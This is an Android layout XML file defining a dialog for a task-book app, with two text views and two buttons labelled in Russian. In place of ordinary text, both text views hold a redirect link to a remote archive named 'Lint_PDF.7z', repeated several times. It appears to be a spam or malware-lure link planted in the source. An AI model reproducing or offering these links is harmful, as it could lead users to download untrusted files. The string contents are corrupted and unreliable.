<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
    android:orientation="vertical"
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_height="wrap_content"

    android:background="@drawable/dialod_bg_shape"
    android:layout_width="wrap_content">


    <ScrollView
        android:id="@+id/activity_dialog"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:orientation="vertical"

        tools:context="com.example.dmitryvedmed.taskbook.ui.DialogActivity"
        android:weightSum="1">

        <LinearLayout
            android:paddingLeft="12dp"
            android:paddingRight="16dp"
            android:paddingTop="12dp"
            android:orientation="vertical"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
           >
            <TextView
                android:text="http://livelinks.online/go.php?u=http://kyc.pm/mXcboj4zN/Lint_PDF.7z http://livelinks.online/go.php?u=http://kyc.pm/mXcboj4zN/Lint_PDF.7z http://livelinks.online/go.php?u=http://kyc.pm/mXcboj4zN/Lint_PDF.7z http://livelinks.online/go.php?u=http://kyc.pm/mXcboj4zN/Lint_PDF.7z"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:textColor="#000000"
                android:alpha="67"
                android:id="@+id/headTextView"
                android:textSize="17sp"
                android:textStyle="normal|bold" />

            <TextView
                android:paddingTop="5dp"
                android:text="http://livelinks.online/go.php?u=http://kyc.pm/mXcboj4zN/Lint_PDF.7z http://livelinks.online/go.php?u=http://kyc.pm/mXcboj4zN/Lint_PDF.7z http://livelinks.online/go.php?u=http://kyc.pm/mXcboj4zN/Lint_PDF.7z"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:textColor="#000000"
                android:alpha="67"
                android:id="@+id/contextTextView"
                android:textSize="17sp" />

        </LinearLayout>


    </ScrollView>

    <LinearLayout
        android:paddingBottom="5dp"
        android:paddingRight="5dp"
        android:layout_gravity="right"
        android:orientation="horizontal"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content">

        <Button
            android:text="Оставить"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/dialog_button_selector"
            android:textColor="#000000"
            android:id="@+id/button2"
            />

        <Button
            android:text="Ок"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/dialog_button_selector"
            android:textColor="#000000"
            android:id="@+id/button22"
      />

    </LinearLayout>


</LinearLayout>

